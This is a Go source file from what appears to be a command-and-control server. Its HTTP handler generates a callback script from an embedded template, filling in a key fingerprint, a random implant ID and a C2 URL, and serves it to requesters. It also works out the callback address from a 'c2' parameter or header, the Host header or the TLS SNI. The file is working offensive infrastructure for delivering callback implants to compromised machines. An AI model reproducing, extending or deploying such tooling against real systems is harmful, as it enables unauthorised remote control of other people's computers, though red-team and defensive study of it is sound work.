package hsrv

/*
 * script.go
 * HTTP handlers
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240329
 */

import (
	"bytes"
	_ "embed"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strconv"

	"golang.org/x/net/idna"
)

// HTTPSPort is the default port for HTTPS and won't be added to URLs in
// generated scripts.
const HTTPSPort = "443"

// TemplateParams are combined with the callback template to generate the
// callback script.
type TemplateParams struct {
	PubkeyFP string
	URL      string
	ID       string
}

// C2Param is a URL parameter or header which may be set in requetss to /c to
// give the URL to which to call back.
const C2Param = "c2"

//go:embed script.tmpl
var DefaultTemplate string

// scriptHandler serves up a script for calling us back.  Hope we like fork and
// exec...
func (s *Server) scriptHandler(w http.ResponseWriter, r *http.Request) {
	/* Generate template parameters. */
	c2, err := s.c2URL(r)
	if nil != err {
		s.RErrorLogf(r, "Could not determine callback URL: %s", err)
		http.Error(w, "Huh?", http.StatusBadRequest)
		return
	}
	params := TemplateParams{
		PubkeyFP: s.l.Fingerprint,
		ID:       strconv.FormatUint(rand.Uint64(), 36),
		URL:      c2,
	}

	/* Execute the template and send it back. */
	b := new(bytes.Buffer)
	if err := s.tmpl.Execute(b, params); nil != err {
		s.RErrorLogf(r, "Failed to execute callback template: %s", err)
		http.Error(w, "Bother.", http.StatusInternalServerError)
		return
	}

	b.WriteTo(w)
	s.RLogf(
		ScriptColor,
		r,
		"Sent script: ID:%s URL:%s",
		params.ID,
		params.URL,
	)
}

// c2URL tries to get a C2 URL from r.  We try a query/form parameter, a
// c2: header, the Host: header, and the SNI, in that order.
func (s *Server) c2URL(r *http.Request) (string, error) {
	/* Parse the query and form and try to get it from there. */
	if err := r.ParseForm(); nil != err {
		return "", fmt.Errorf("parsing request: %w", err)
	}
	if p := r.Form.Get(C2Param); "" != p {
		return p, nil
	}

	/* If it's not there, try to get it as a header. */
	if p := r.Header.Get(C2Param); "" != p {
		return p, nil
	}

	/* Failing that, try the Host: header. */
	if p, err := idna.ToASCII(r.Host); nil != err {
		return "", fmt.Errorf("punycoding %s: %w", r.Host, err)
	} else if "" != p {
		return p, nil
	}

	/* No Host: header.  Probably HTTP/1.0.  Try the SNI. */
	if p := r.TLS.ServerName; "" != p {
		/* Make sure to add the port if it's not the default.  This
		should be infrequent enough we can do it every time.  Famous
		last words. */
		_, lp, err := net.SplitHostPort(s.l.Addr().String())
		if nil != err {
			return "", fmt.Errorf("getting listen port: %w", err)
		}
		if lp != HTTPSPort {
			p = net.JoinHostPort(p, lp)
		}
		return p, nil
	}

	/* Out of ideas at this point. */
	return "", errors.New("out of ideas")
}
